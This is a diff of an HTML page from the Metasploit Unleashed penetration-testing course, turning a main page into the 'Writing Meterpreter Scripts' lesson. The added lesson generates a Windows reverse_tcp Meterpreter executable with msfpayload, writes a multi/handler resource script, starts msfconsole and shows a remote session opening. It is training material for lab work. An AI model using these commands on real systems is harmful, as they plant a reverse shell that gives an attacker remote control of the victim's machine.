@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Writing Meterpreter Scripts - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Writing_Meterpreter_Scripts" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Writing_Meterpreter_Scripts&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Writing_Meterpreter_Scripts&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Writing_Meterpreter_Scripts&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,241 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Writing Meterpreter Scripts</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Writing_Meterpreter_Scripts#column-one">navigation</a>, <a href="Writing_Meterpreter_Scripts#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>There are a few things you need to keep in mind when creating a new meterpreter script.
+<br />
+</p>
+<dl><dd><ul><li>Not all versions of Windows are the same
+</li><li>Some versions of Windows have security countermeasures for some of the commands
+</li><li>Not all command line tools are in all versions of Windows.
+</li><li>Some of the command line tools switches vary depending on the version of Windows
+</li></ul>
+</dd></dl>
+<p><br />
+In short, the same constraints that you have when working with standard exploitation methods. MSF can be of great help, but it can’t change the fundamentals of that target. Keeping this in mind can save a lot of frustration down the road. So keep your target’s Windows version and service pack in mind, and build to it.
+<br />
+<br />
+For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us. This will rule out any problems with an exploit as we work through our script development.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>cd ~/</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.184 X > Meterpreter.exe</span>
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/reverse_tcp
+Length: 310
+Options: LHOST=192.168.1.184</pre>
+<br />
+Wonderful. Now, we move the executable to our Windows machine that will be our target for the script we are going to write. We just have to set up our listener. To do this, lets create a short script to start up multi-handler for us.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>touch meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>echo use exploit/multi/handler >> meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>echo set LHOST 192.168.1.184 >> meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>echo set ExitOnSession false >> meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>echo exploit -j -z >> meterpreter.rc</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>cat meterpreter.rc</span>
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.184
+set ExitOnSession false
+exploit -j -z</pre>
+<br />
+Here we are using the exploit multi handler to receive our payload, we specify that the payload is a Meterpreter reverse_tcp payload, we set the payload option, we make sure that the multi handler will not exit once it receives a session since we might need to re-establish one due to an error or we might be testing under different versions of Windows from different target hosts.
+</p><p><br />
+While working on the scripts, we will save the test scripts to /pentest/exploits/framework/scripts/meterpreter so that they can be run.
+</p><p><br />
+Now, all that remains is to start up msfconsole with our our resource script.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfconsole -r meterpreter.rc</span>
+
+
+       =[ metasploit v4.2.0-dev [core:4.2 api:1.0]
++ -- --=[ 787 exploits - 425 auxiliary - 128 post
++ -- --=[ 238 payloads - 27 encoders - 8 nops
+       =[ svn r14551 updated yesterday (2012.01.14)
+
+resource> use exploit/multi/handler
+resource> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource> set LHOST 192.168.1.184
+LHOST => 192.168.1.184
+resource> set ExitOnSession false
+ExitOnSession => false
+resource> exploit -j -z
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...</pre>
+<br />
+As can be seen above, Metasploit is listening for a connection. We can now execute our executable in our Windows host and we will receive a session. Once the session is established, we use the sessions command with the '–i' switch and the number of the session to interact with it:
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Sending stage (718336 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>sessions -i 1</span>
+<span style='color:#0000FF;'>[*]</span> Starting interaction with 1...
+
+<u>meterpreter</u> ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Meterpreter_Scripting" title="Meterpreter Scripting">Meterpreter Scripting</a> &gt; Writing Meterpreter Scripts</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Existing_Scripts" title="Existing Scripts">Existing Scripts</a> &#124; <strong class="selflink">Writing Meterpreter Scripts</strong> &#124; <a href="Custom_Scripting" title="Custom Scripting">Custom Scripting</a> &#124; <a href="Useful_API_Calls" title="Useful API Calls">Useful API Calls</a> &#124; <a href="Useful_Functions" title="Useful Functions">Useful Functions</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 514/1000000
+Preprocessor generated node count: 2679/1000000
+Post‐expand include size: 4828/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:72-0!*!0!*!*!*!* and timestamp 20131124055134 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Writing_Meterpreter_Scripts&amp;oldid=1531">http://www.offensive-security.com/w/index.php?title=Writing_Meterpreter_Scripts&amp;oldid=1531</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Meterpreter_Scripting&amp;action=edit&amp;redlink=1" class="new" title="Category:Meterpreter Scripting (page does not exist)">Meterpreter Scripting</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +726,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.142 secs. --></body></html>
